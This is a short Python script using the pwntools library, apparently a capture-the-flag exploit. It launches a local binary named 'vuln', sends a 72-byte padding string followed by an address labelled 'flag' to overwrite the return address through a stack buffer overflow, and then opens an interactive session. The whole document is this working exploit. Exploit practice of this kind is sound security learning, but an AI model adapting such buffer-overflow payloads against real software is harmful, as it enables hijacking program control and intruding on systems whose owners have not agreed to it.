#!/usr/bin/env python

from pwn import *

r = process("./vuln")

flag = 0x000000000400767
ret = 0x00000000004005de

r.sendlineafter(":", 'a' * 72 + p64(0) + p64(flag))

r.interactive()
